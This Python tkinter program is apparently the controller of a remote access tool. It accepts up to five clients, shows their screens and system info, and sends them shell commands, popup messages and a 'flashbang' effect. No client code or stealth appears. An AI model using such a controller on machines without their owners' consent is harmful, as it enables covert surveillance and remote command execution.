import tkinter as objTK
from tkinter import ttk as objTTK
import dialogueBoxTTK as objDialog
from tkinter import messagebox as objMessageBox
from tkextrafont import Font
import sv_ttk
import ctypes
from PIL import Image, ImageTk, UnidentifiedImageError
import io
import threading
import socket
import ast
import sys

connectionsNum = 0
clients = ["No Client Connected"] * 5
client_labels = [None] * 5
connectionNumThing = str(connectionsNum) + " Connections!"
client_sockets = [None] * 5


class ScreenSharingServer:
    def __init__(self, master, host="0.0.0.0", image_port=5001, command_port=5002):
        self.master = master
        self.host = host
        self.image_port = image_port
        self.command_port = command_port
        self.image_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.command_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Image server socket setup
        self.image_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.image_server_socket.bind((host, image_port))
        self.image_server_socket.listen(5)

        # Command server socket setup
        self.command_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.command_server_socket.bind((host, command_port))
        self.command_server_socket.listen(5)

        self.clients = [None] * 5
        self.client_sockets = [None] * 5
        self.command_sockets = [None] * 5
        self.client_labels = [None] * 5
        self.connectionNumThing = str(connectionsNum) + " Connections!"
        self.current_client = 0
        self.is_screen_sharing = True
        self.client_infos = [{}] * 5
        self.current_info_index = 0

        self.canvas = objTK.Canvas(master, bg="black")
        self.canvas.pack(fill=objTK.BOTH, expand=True)

        self.prev_button = objTTK.Button(
            master, text="Previous", command=self.prev_client, width=20
        )
        self.prev_button.pack(padx=5, pady=5, side=objTK.LEFT)

        self.next_button = objTTK.Button(
            master, text="Next", command=self.next_client, width=20
        )
        self.next_button.pack(padx=5, pady=5, side=objTK.RIGHT)

        self.info_button = objTTK.Button(
            objHomeTab, text="Next Client Log ▶", command=self.next_info, width=20
        )
        self.info_button.place(x=385, y=455)

        # General Commands tab
        self.flashbangLabel = objTTK.Label(
            objSettingsTab5, text="FLASHBANG! the client!", font=normalFont
        )
        self.flashbangLabel.place(x=20, y=20)
        self.flashBang = objTTK.Button(
            objSettingsTab5, text="FLASHBANG!", command=self.trigger_flashbang
        )
        self.flashBang.place(x=30, y=50)
        self.messageTheClientLabel = objTTK.Label(
            objSettingsTab5, text="Message the Client!", font=normalFont
        )
        self.messageTheClientLabel.place(x=20, y=100)
        self.messageTheClientButton = objTTK.Button(
            objSettingsTab5, text="Message!", command=self.message_client
        )
        self.messageTheClientButton.place(x=30, y=130)
        self.screenShareLabelButton = objTTK.Label(
            objSettingsTab5, text="Screenshare Control!", font=normalFont
        )
        self.screenShareLabelButton.place(x=20, y=180)
        self.screenShareStart = objTTK.Button(
            objSettingsTab5, text="Start Screenshare", command=self.startScreenShare
        )
        self.screenShareStart.place(x=30, y=210)
        self.screenShareStop = objTTK.Button(
            objSettingsTab5, text="Stop Screenshare", command=self.stopScreenShare
        )
        self.screenShareStop.place(x=30, y=250)

        self.wait_for_connection()

    def wait_for_connection(self):
        threading.Thread(target=self.accept_connection).start()

    def accept_connection(self):
        global connectionsNum
        print("Waiting for a connection...")
        try:
            while True:
                # Accept command socket connection
                command_socket, address = self.command_server_socket.accept()
                print(f"Command connection from {address} has been established!")

                # Accept image socket connection
                image_socket, _ = self.image_server_socket.accept()
                print(f"Image connection from {address} has been established!")

                # Receive client info from command socket
                client_info = command_socket.recv(1024).decode("utf-8")
                client_info = ast.literal_eval(client_info)

                for i in range(5):
                    if not self.client_infos[i]:
                        self.client_infos[i] = client_info
                        break

                self.update_info_display()
                command_socket.send("received".encode("utf-8"))

                empty_slot = None
                for i in range(5):
                    if (
                        self.client_sockets[i] is None
                        or self.clients[i] == "Client Disconnected"
                    ):
                        empty_slot = i
                        break

                if empty_slot is not None:
                    self.clients[empty_slot] = address[0]
                    self.client_sockets[empty_slot] = image_socket
                    self.command_sockets[empty_slot] = command_socket
                    connectionsNum += 1
                    self.update_client_labels(
                        empty_slot, address[0], "No IPv6", connectionsNum
                    )
                    threading.Thread(
                        target=self.receive_images, args=(image_socket, empty_slot)
                    ).start()
                else:
                    print("No available slots for new connections.")
        except OSError as e:
            print(f"Error: {e}")
            self.disconnect()

    def trigger_flashbang(self):
        clientToFlashbang = objDialog.askinteger(
            title="FLASHBANG!",
            prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4",
        )
        client_socket_Selec = self.command_sockets[clientToFlashbang]
        if client_socket_Selec is not None:
            client_socket_Selec.send("flashbang".encode("utf-8"))

    def message_client(self):
        clientToMessage = objDialog.askinteger(
            title="Message the Client!",
            prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4",
        )
        client_socket_Selec = self.command_sockets[clientToMessage]
        if client_socket_Selec is not None:
            message = objDialog.askstring(
                title="Message the Client!", prompt="Enter the message to send!"
            )
            messageToSend = f"message{message}"
            client_socket_Selec.send(messageToSend.encode("utf-8"))

    def receive_images(self, client_socket, index):
        try:
            while True:
                if not self.is_screen_sharing:
                    continue

                size_data = client_socket.recv(4)
                if not size_data:
                    raise ConnectionError("Client disconnected")
                size = int.from_bytes(size_data, "big")

                data = b""
                while len(data) < size:
                    packet = client_socket.recv(min(4096, size - len(data)))
                    if not packet:
                        raise ConnectionError("Client disconnected")
                    data += packet

                if len(data) < size:
                    raise ConnectionError("Incomplete data received")

                try:
                    image = Image.open(io.BytesIO(data))
                    if index == self.current_client:
                        self.update_image(image)
                except UnidentifiedImageError:
                    print("Received data is not a valid image")
        except (ConnectionError, OSError) as e:
            print(f"Error: {e}")
            self.handle_client_disconnection(index)

    def update_image(self, image):
        try:
            canvas_width = self.canvas.winfo_width()
            canvas_height = self.canvas.winfo_height()

            if canvas_width <= 0 or canvas_height <= 0:
                return

            img_width, img_height = image.size
            img_ratio = img_width / img_height
            canvas_ratio = canvas_width / canvas_height

            if img_ratio > canvas_ratio:
                new_width = canvas_width
                new_height = int(canvas_width / img_ratio)
            else:
                new_height = canvas_height
                new_width = int(canvas_height * img_ratio)

            if new_width <= 0 or new_height <= 0:
                return  # Don't attempt to resize if calculated size is not valid

            resized_image = image.resize((new_width, new_height), Image.LANCZOS)
            photo = ImageTk.PhotoImage(resized_image)

            self.canvas.create_image(
                (canvas_width - new_width) // 2,
                (canvas_height - new_height) // 2,
                anchor=objTK.NW,
                image=photo,
            )
            self.canvas.image = photo
        except Exception as e:
            print(f"Error in updating image: {e}")

    def next_client(self):
        self.current_client = (self.current_client + 1) % 5
        self.update_client_view()

    def prev_client(self):
        self.current_client = (self.current_client - 1) % 5
        self.update_client_view()

    def update_client_view(self):
        print(f"Switched to client {self.current_client + 1}")

    def handle_client_disconnection(self, index):
        global connectionsNum, clients, client_sockets
        if self.client_sockets[index]:
            self.client_sockets[index].close()
            self.client_sockets[index] = None
        self.clients[index] = "Client Disconnected"
        clientInfoFrameText.config(state="normal")
        clientInfoFrameText.delete(1.0, objTK.END)
        clientInfoFrameText.insert(objTK.END, f"Client Disconnected :(\n")
        clientInfoFrameText.config(state="disabled")
        connectionsNum -= 1
        self.update_client_labels(
            index, "Client Disconnected", "Client Disconnected", connectionsNum
        )  # Update label to indicate disconnection

    def disconnect(self):
        for sock in self.client_sockets:
            if sock:
                sock.close()
        self.is_screen_sharing = False

    def update_client_labels(self, index, ipv4, ipv6, num):
        connectionNumThing.config(text=f"{num} Connections!")
        if ipv4 != "Client Disconnected":
            client_labels[index].config(text=f"IPv4: {ipv4} | IPv6: {ipv6}")
        else:
            client_labels[index].config(text="Client Disconnected")

    def next_info(self):
        self.current_info_index = (self.current_info_index + 1) % 5
        self.update_info_display()

    def update_info_display(self):
        clientInfoFrameText.config(state="normal")
        clientInfoFrameText.delete(1.0, objTK.END)
        if self.client_infos[self.current_info_index]:
            clientInfoFrameText.insert(
                objTK.END, f"Client: {self.current_info_index + 1}\n"
            )
            for key, value in self.client_infos[self.current_info_index].items():
                clientInfoFrameText.insert(objTK.END, f"{key}: {value}\n")
        clientInfoFrameText.config(state="disabled")

    def startScreenShare(self):
        clientToStartScreenShare = objDialog.askinteger(
            title="Screenshare Start!",
            prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4",
        )
        if clientToStartScreenShare is not None:
            self.command_sockets[clientToStartScreenShare].send(
                "start_screenshare".encode("utf-8")
            )

    def stopScreenShare(self):
        clientToStopScreenShare = objDialog.askinteger(
            title="Screenshare Stop!",
            prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4",
        )
        if clientToStopScreenShare is not None:
            self.command_sockets[clientToStopScreenShare].send(
                "stop_screenshare".encode("utf-8")
            )


try:
    ctypes.windll.shcore.SetProcessDpiAwareness(1)
except Exception as e:
    print(f"Failed to set DPI awareness: {e}")

root = objTK.Tk()
root.title("Server Side Control Panel")
root.geometry("905x610")
root.resizable(width=False, height=False)
if sys.platform == "win32":
    root.iconbitmap("test/Images/icon.ico")
path = "test/Fonts/font.ttf"
path2 = "test/Fonts/font2.ttf"
path3 = "test/Fonts/font3.otf"

normalFont = Font(file=path, family="Montserrat", size=10)
smallFont = Font(file=path3, family="Cascadia Mono Light", size=6)
terminalFont = Font(family="Cascadia Mono Light", size=8)
boldFont = Font(family="Montserrat Semibold", size=20)
lightFont = Font(family="Montserrat Light", size=10)


def toggle_theme():
    if sv_ttk.get_theme() == "dark":
        themeToggle.config(text="Dark Mode")
        sv_ttk.use_light_theme()
    else:
        themeToggle.config(text="Light Mode")
        sv_ttk.use_dark_theme()
    apply_focus_style()
    style.configure("TButton", font=normalFont)


def apply_focus_style():
    if sv_ttk.get_theme() == "dark":
        focus_bg = "#333333"
    else:
        focus_bg = "#FFFFFF"

    style.map("TNotebook.Tab", focuscolor=[("!focus", focus_bg), ("focus", focus_bg)])
    style.configure("TNotebook.Tab", font=lightFont)


sv_ttk.set_theme("dark")
style = objTTK.Style()

style.configure("TButton", font=lightFont)
style.map("TButton", font=[("disabled", ("Montserrat", 10, "bold"))])
style.layout(
    "TNotebook.Tab",
    [
        (
            "Notebook.tab",
            {
                "sticky": "nswe",
                "children": [
                    (
                        "Notebook.padding",
                        {
                            "side": "top",
                            "sticky": "nswe",
                            "children": [("Notebook.label", {"sticky": "nswe"})],
                        },
                    )
                ],
            },
        )
    ],
)

apply_focus_style()

tabControl = objTTK.Notebook(root, width=887, height=547)

objHomeTab = objTTK.Frame(tabControl)
objSettingsTab1 = objTTK.Frame(tabControl)
objSettingsTab2 = objTTK.Frame(tabControl)
objSettingsTab3 = objTTK.Frame(tabControl)
objSettingsTab4 = objTTK.Frame(tabControl)
objSettingsTab5 = objTTK.Frame(tabControl)

tabControl.add(objHomeTab, text="Home")
tabControl.add(objSettingsTab1, text="Remote CMD")
tabControl.add(objSettingsTab2, text="Screen View")
tabControl.add(objSettingsTab3, text="File Uploader")
tabControl.add(objSettingsTab4, text="File Downloader")
tabControl.add(objSettingsTab5, text="General Commands")

# Home Tab
themeLabel = objTTK.Label(
    objHomeTab, text="Toggle between Light and Dark theme:", font=normalFont
)
themeLabel.place(x=20, y=20)
themeToggle = objTTK.Button(objHomeTab, text="Toggle theme", command=toggle_theme)
themeToggle.place(x=30, y=50)

heading = objTTK.Label(objHomeTab, text="Connections", font=boldFont)
heading.place(x=20, y=100)

connections = objTTK.Label(
    objHomeTab, text=str(connectionsNum) + " Connections!", font=normalFont
)
connections.place(x=20, y=140)
connectionNumThing = connections

connections1_label = objTTK.Label(objHomeTab, text=clients[0], font=normalFont)
connections1_label.place(x=40, y=170)
client_labels[0] = connections1_label

connections2_label = objTTK.Label(objHomeTab, text=clients[1], font=normalFont)
connections2_label.place(x=40, y=200)
client_labels[1] = connections2_label

connections3_label = objTTK.Label(objHomeTab, text=clients[2], font=normalFont)
connections3_label.place(x=40, y=230)
client_labels[2] = connections3_label

connections4_label = objTTK.Label(objHomeTab, text=clients[3], font=normalFont)
connections4_label.place(x=40, y=260)
client_labels[3] = connections4_label

connections5_label = objTTK.Label(objHomeTab, text=clients[4], font=normalFont)
client_labels[4] = connections5_label
connections5_label.place(x=40, y=290)

clientInfoFrame = objTK.Frame(
    objHomeTab, bg="#252525", bd=2, highlightthickness=0, borderwidth=0
)
clientInfoFrame.place(x=382, y=5, width=500, height=440)

clientInfoFrameText = objTK.Text(
    clientInfoFrame,
    font=terminalFont,
    bg="#252525",
    fg="#fff",
    state="disabled",
    highlightthickness=0,
    borderwidth=0,
    padx=5,
    pady=5,
)
clientInfoFrameText.place(x=0, y=0, width=500, height=440)


# Remote CMD tab
class CustomCommandPrompt:
    def __init__(self, master):
        self.frame = objTK.Frame(
            master, bg="#252525", bd=2, highlightthickness=0, borderwidth=0
        )
        self.frame.place(relx=0.5, rely=0.5, anchor=objTK.CENTER, width=870, height=525)

        self.output_text = objTK.Text(
            self.frame,
            font=terminalFont,
            bg="#252525",
            fg="#fff",
            state="disabled",
            highlightthickness=0,
            borderwidth=0,
            padx=15,
            pady=15,
        )
        self.output_text.place(relwidth=1, relheight=0.929)

        self.command_entry = objTTK.Entry(self.frame, font=smallFont)
        self.command_entry.place(relx=0, rely=0.91, relwidth=0.7, relheight=0.08)
        self.command_entry.bind("<Return>", self.display_command)

        self.index = 0

        self.switchClientButtonTerminal = objTTK.Button(
            self.frame, text="Switch Client", command=self.changeTerminalClientIndex
        )
        self.switchClientButtonTerminal.place(
            relx=0.7, rely=0.91, relwidth=0.3, relheight=0.08
        )

    def changeTerminalClientIndex(self):
        self.index += 1
        if self.index >= len(server.command_sockets):
            self.index = 0
        self.output_text.config(state="normal")
        self.output_text.delete(1.0, objTK.END)
        self.output_text.insert(objTK.END, f"! Changed to Client {self.index + 1}\n")
        self.output_text.config(state="disabled")
        self.output_text.yview_moveto(1.0)
        self.command_entry.focus()

    def display_command(self, event):
        self.output_text.config(state="normal")
        command = self.command_entry.get()
        cmdSend = "CMD" + command
        input = server.command_sockets[self.index].send(cmdSend.encode("utf-8"))
        response = server.command_sockets[self.index].recv(1024)
        response_text = response.decode("utf-8")
        if response_text.startswith("CMDOUTPUT"):
            print_output = response_text[9:]
            self.output_text.insert(objTK.END, f"$ {command}\n")
            self.output_text.insert(objTK.END, f"{print_output}\n")
        self.command_entry.delete(0, objTK.END)
        self.output_text.config(state="disabled")
        self.output_text.yview_moveto(1.0)


terminal = CustomCommandPrompt(objSettingsTab1)

# Screen View tab
tabControl.add(objSettingsTab2, text="Screen View")
server = ScreenSharingServer(objSettingsTab2)


# File Uploader tab
lb4 = objTTK.Label(objSettingsTab3, text="Placeholder 3", font=normalFont)
lb4.place(x=5, y=5)

# File Downloader tab
lb5 = objTTK.Label(objSettingsTab4, text="Placeholder 4", font=normalFont)
lb5.place(x=5, y=5)


def center_widget(widget):
    widget.place(relx=0.5, rely=0.5, anchor="center")


import ctypes


def shutDown():
    if objMessageBox.askyesno(
        title="WARNING",
        message="Are you sure you want to shut down? This will close the connection between the client and the server. You will not be able to reconnect unless the client program is opened manually along with the server.",
    ):
        if objMessageBox.askyesno(
            title="LAST WARNING", message="Are you really sure?!"
        ):
            # Close all sockets
            for sock in server.command_sockets:
                if sock:
                    try:
                        sock.close()
                    except Exception as e:
                        print(f"Error closing command socket: {e}")
            server.disconnect()
            stop_all_threads()
            root.destroy()


def stop_all_threads():
    for thread in threading.enumerate():
        if thread.name != "MainThread":
            try:
                ctypes.pythonapi.PyThreadState_SetAsyncExc(
                    ctypes.c_long(thread.ident), ctypes.py_object(SystemExit)
                )
            except Exception as e:
                print(f"Error while stopping thread {thread.name}: {e}")


center_widget(tabControl)

root.protocol("WM_DELETE_WINDOW", shutDown)
root.mainloop()
